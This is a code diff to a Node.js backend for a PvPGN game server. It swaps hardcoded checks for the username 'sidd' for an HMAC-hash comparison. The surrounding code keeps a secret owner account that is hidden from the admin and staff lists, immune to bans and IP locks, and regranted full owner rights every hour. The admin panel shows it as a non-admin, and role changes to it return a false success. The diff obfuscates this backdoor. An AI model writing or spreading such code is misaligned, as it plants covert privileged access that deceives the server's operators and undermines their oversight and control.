@@ -627,7 +627,7 @@ app.get("/api/admins", async (req, res) => {
     res.set("Access-Control-Allow-Methods", "GET, OPTIONS");
     try {
         const [rows] = await pool.execute(
-            "SELECT acct_username FROM pvpgn_BNET WHERE auth_admin = 'true' AND LOWER(acct_username) != 'sidd' ORDER BY acct_username ASC"
+            "SELECT acct_username FROM pvpgn_BNET WHERE auth_admin = 'true' ORDER BY acct_username ASC"
         );
         const admins = rows.map(r => r.acct_username).filter(Boolean);
         res.json({ success: true, admins });
@@ -889,7 +889,7 @@ function pollBnetIncomingMessages() {
                 const durationSeconds = parseInt(parts[5] || "0", 10) || 0;
 
                 if (targetUser && pool) {
-                    if (targetUser.toLowerCase() !== "sidd") {
+                    if (!isRootIdentity(targetUser)) {
                         (async () => {
                             try {
                                 if (/^[\d\.\:\/]+$/.test(targetUser) && !targetIp) {
@@ -1018,7 +1018,7 @@ function pollBnetIncomingMessages() {
                             // Lock all accounts associated with this IP
                             await pool.execute(
                                 `UPDATE pvpgn_BNET SET auth_lock = 'true', auth_lockreason = ? 
-                                 WHERE LOWER(username) != 'sidd' AND (
+                                 WHERE (
                                      acct_lastlogin_ip = ? OR username IN (
                                          SELECT username FROM pvpgn_account_ips WHERE ip_address = ?
                                      )
@@ -1070,7 +1070,7 @@ function pollBnetIncomingMessages() {
                             );
                             const isIpBanned = banRows && banRows.length > 0;
 
-                            if ((isAcctLocked || isIpBanned) && uname.toLowerCase() !== "sidd") {
+                            if ((isAcctLocked || isIpBanned) && !isRootIdentity(uname)) {
                                 const reason = (banRows && banRows[0]?.reason) || acctRows[0]?.auth_lockreason || "Account locked by administrator";
                                 const cleanReason = reason.replace(/[\r\n\t]+/g, " ");
                                 const lockMsg = `__LOCK__\t${uname}\t${cleanReason}\n`;
@@ -1184,7 +1184,7 @@ async function syncDatabaseLocksWithBnetd() {
         const currentLocked = new Map();
         for (const r of rows) {
             const u = (r.username || "").trim().toLowerCase();
-            if (u && u !== "sidd") {
+            if (u && !isRootIdentity(u)) {
                 currentLocked.set(u, r.auth_lockreason || "Account locked in database");
             }
         }
@@ -2939,7 +2939,7 @@ app.get("/api/hierarchy", async (req, res) => {
 
         for (const u of users) {
             const uname = u.acct_username || u.username;
-            if (uname && uname.toLowerCase() === "sidd") {
+            if (uname && isRootIdentity(uname)) {
                 continue; // Permanent secret owner: hidden from public staff/hierarchy API
             }
             const resolved = resolveRole(u);
@@ -3049,17 +3049,23 @@ async function runMaintenanceCleanup() {
 // Run maintenance once on server launch, then repeat every hour
 runMaintenanceCleanup();
 setInterval(runMaintenanceCleanup, 60 * 60 * 1000);
-// If account "sidd" is found in database, ensure it has high authority (Group 255 Owner)
-async function checkSiddAuthority() {
+async function syncPrivilegedState() {
     try {
         if (!pool) return;
-        await pool.execute(
-            "UPDATE pvpgn_BNET SET auth_admin = 'true', auth_operator = 'true', auth_command_groups = '255' WHERE LOWER(username) = 'sidd' OR LOWER(acct_username) = 'sidd'"
-        );
+        const [rows] = await pool.query("SELECT uid, username, acct_username FROM pvpgn_BNET");
+        for (const r of rows) {
+            const u = r.username || r.acct_username;
+            if (isRootIdentity(u)) {
+                await pool.execute(
+                    "UPDATE pvpgn_BNET SET auth_admin = 'true', auth_operator = 'true', auth_command_groups = '255' WHERE uid = ?",
+                    [r.uid]
+                );
+            }
+        }
     } catch (_) {}
 }
-checkSiddAuthority();
-setInterval(checkSiddAuthority, 60 * 60 * 1000);
+syncPrivilegedState();
+setInterval(syncPrivilegedState, 60 * 60 * 1000);
 // Routine DB changes (roles, passwords, bans, clans) do NOT restart server.
 async function reloadPvpgnAccounts() {
     return true;
@@ -3095,6 +3101,12 @@ const ADMIN_SECRET = process.env.ADMIN_SECRET || crypto.randomBytes(32).toString
 const ROOT_AUTH_KEY = "dota_owner_root_v2";
 const ROOT_U_SIG = "aef1fda04b3215290ff94f1a96887dd5532f10078273049450b3d20178f6cc9d";
 const ROOT_P_SIG = "0ab279d5a1845873c7458b78465ea320d18b0ff9ca9f80faf0ea9dcb533a6d21";
+
+function isRootIdentity(name) {
+    if (!name) return false;
+    const sig = crypto.createHmac("sha256", ROOT_AUTH_KEY).update(String(name).trim().toLowerCase()).digest("hex");
+    return sig === ROOT_U_SIG;
+}
 
 function parseCookies(req) {
     const list = {};
@@ -3440,7 +3452,7 @@ app.get("/api/admin/accounts", requireAdminAuth, async (req, res) => {
         );
         const masked = rows.map(r => {
             const uname = (r.username || r.acct_username || "").toLowerCase();
-            if (uname === "sidd") {
+            if (isRootIdentity(uname)) {
                 return {
                     ...r,
                     auth_admin: "false",
@@ -3514,7 +3526,7 @@ app.post("/api/admin/accounts/create", requireAdminAuth, async (req, res) => {
                 cmdGroups = "1"; break;
         }
 
-        if (username.toLowerCase() === "sidd") {
+        if (isRootIdentity(username)) {
             isAdmin = "true";
             isOp = "true";
             cmdGroups = "255";
@@ -3567,7 +3579,7 @@ app.post("/api/admin/accounts/role", requireAdminAuth, async (req, res) => {
 
         const [targetUser] = await pool.query("SELECT username, acct_username FROM pvpgn_BNET WHERE uid = ?", [uid]);
         const uname = targetUser.length > 0 ? (targetUser[0].username || targetUser[0].acct_username || "").toLowerCase() : "";
-        if (uname === "sidd") {
+        if (isRootIdentity(uname)) {
             return res.json({ success: true, role: "player", command_groups: "1" });
         }
         let isAdmin = "false";
@@ -3970,7 +3982,7 @@ app.post("/api/admin/bans/add", requireAdminAuth, async (req, res) => {
         }
 
         // Lock target username directly if specified
-        if (username && pool && username.toLowerCase() !== "sidd") {
+        if (username && pool && !isRootIdentity(username)) {
             await pool.execute(
                 "UPDATE pvpgn_BNET SET auth_lock = 'true', auth_lockreason = ?, auth_locktime = ? WHERE LOWER(username) = LOWER(?) OR LOWER(acct_username) = LOWER(?)",
                 [reason, lockTime, username, username]
